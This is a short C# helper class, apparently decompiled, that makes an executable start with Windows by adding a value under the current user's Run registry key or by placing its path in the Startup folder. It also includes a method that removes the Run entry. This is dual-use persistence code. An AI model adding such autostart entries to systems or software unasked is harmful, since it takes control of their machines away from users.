using System;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace Main.Tools;

internal static class Windows
{
	internal enum StartupMethodType
	{
		StartupFolder,
		Registry
	}

	private static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);

	private const uint SWP_NOSIZE = 1u;

	private const uint SWP_NOMOVE = 2u;

	internal static void SetStartup(StartupMethodType startupMethod)
	{
		switch (startupMethod)
		{
		case StartupMethodType.Registry:
			try
			{
				SetStartupRegistry(Config.FinalExePath);
				break;
			}
			catch
			{
				SetStartupFolder();
				break;
			}
		case StartupMethodType.StartupFolder:
			SetStartupFolder();
			break;
		}
	}

	private static void SetStartupFolder()
	{
		if (Config.FinalExeRelativePath != null)
		{
			Config.FinalExePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), Path.GetFileName(Config.FinalExeRelativePath));
		}
	}

	private static void SetStartupRegistry(string exePath)
	{
		Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)?.SetValue(Path.GetFileName(exePath), exePath);
	}

	internal static void RemoveStartupRegistry(string exePath)
	{
		Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)?.DeleteValue(Path.GetFileName(exePath), throwOnMissingValue: false);
	}

	[DllImport("user32.dll")]
	private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
}
